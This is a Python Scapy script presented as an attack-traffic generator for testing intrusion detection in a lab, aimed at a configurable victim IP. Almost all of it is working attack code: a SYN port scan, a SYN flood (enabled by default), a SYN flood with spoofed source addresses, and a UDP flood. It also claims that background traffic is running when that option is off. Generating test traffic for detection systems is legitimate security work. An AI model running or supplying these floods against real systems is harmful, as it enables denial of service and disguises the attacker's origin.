# ============================================================
# SCAPY LIVE ATTACK TRAFFIC GENERATOR FOR IDS TESTING
# Run only in isolated lab / VM network.
# Requires: pip install scapy
# Run as admin/root.
# ============================================================

from scapy.all import IP, TCP, UDP, ICMP, send
import random
import time
import threading


# =========================
# CONFIGURATION
# =========================
TARGET_IP = "192.168.3.160"     # victim machine
TARGET_PORT = 80              # common service port
INTERFACE = None              # None = default route

BENIGN_ENABLED = False

# =========================
# HELPERS
# =========================
def rand_ip():
    return ".".join(str(random.randint(1, 254)) for _ in range(4))

def send_pkt(pkt):
    send(pkt, iface=INTERFACE, verbose=0)

# ============================================================
# BENIGN TRAFFIC
# ============================================================
def benign_traffic():
    """
    Continuous low-rate normal-ish traffic.
    """
    while True:
        choice = random.choice(["icmp", "tcp", "udp"])

        if choice == "icmp":
            pkt = IP(dst=TARGET_IP) / ICMP()

        elif choice == "tcp":
            sport = random.randint(1024, 65535)
            pkt = IP(dst=TARGET_IP) / TCP(
                sport=sport,
                dport=TARGET_PORT,
                flags="S"
            )

        else:
            sport = random.randint(1024, 65535)
            pkt = IP(dst=TARGET_IP) / UDP(
                sport=sport,
                dport=53
            )

        send_pkt(pkt)
        time.sleep(random.uniform(0.5, 2.0))

# ============================================================
# PORT SCAN ATTACK
# ============================================================
def port_scan(start_port=1, end_port=1024, delay=0.01):
    """
    SYN scan across ports.
    """
    print("[*] Starting Port Scan")

    for port in range(start_port, end_port + 1):
        pkt = IP(dst=TARGET_IP) / TCP(
            dport=port,
            flags="S"
        )
        send_pkt(pkt)
        time.sleep(delay)

    print("[*] Port Scan Complete")

# ============================================================
# DoS ATTACK (SYN FLOOD)
# ============================================================
def dos_syn_flood(packet_count=5000):
    """
    Single-source SYN flood.
    """
    print("[*] Starting DoS SYN Flood")

    for _ in range(packet_count):
        sport = random.randint(1024, 65535)

        pkt = IP(dst=TARGET_IP) / TCP(
            sport=sport,
            dport=TARGET_PORT,
            flags="S"
        )

        send_pkt(pkt)

    print("[*] DoS SYN Flood Complete")

# ============================================================
# DDoS-LIKE ATTACK (Spoofed Sources)
# ============================================================
def ddos_syn_flood(packet_count=10000):
    """
    Multi-source simulated SYN flood using spoofed IPs.
    """
    print("[*] Starting DDoS Simulation")

    for _ in range(packet_count):
        pkt = IP(
            src=rand_ip(),
            dst=TARGET_IP
        ) / TCP(
            sport=random.randint(1024, 65535),
            dport=TARGET_PORT,
            flags="S"
        )

        send_pkt(pkt)

    print("[*] DDoS Simulation Complete")

# ============================================================
# OPTIONAL UDP FLOOD
# ============================================================
def udp_flood(packet_count=5000):
    """
    Optional UDP flood.
    """
    print("[*] Starting UDP Flood")

    for _ in range(packet_count):
        pkt = IP(dst=TARGET_IP) / UDP(
            sport=random.randint(1024, 65535),
            dport=random.randint(1, 65535)
        )
        send_pkt(pkt)

    print("[*] UDP Flood Complete")

# ============================================================
# MAIN MENU
# ============================================================
if __name__ == "__main__":

    print("=" * 50)
    print("Scapy IDS Attack Generator")
    print("=" * 50)

    # Start benign background traffic
    if BENIGN_ENABLED:
        threading.Thread(
            target=benign_traffic,
            daemon=True
        ).start()

    # --------------------------------------------------------
    # COMMENT / UNCOMMENT ATTACKS AS NEEDED
    # --------------------------------------------------------

    # port_scan()

    dos_syn_flood()

    # ddos_syn_flood()

    # udp_flood()

    # --------------------------------------------------------

    print("[*] Background benign traffic running...")
    print("[*] Uncomment attack functions in script to launch tests.")
    print("[*] Press Ctrl+C to stop.")

    while True:
        time.sleep(1)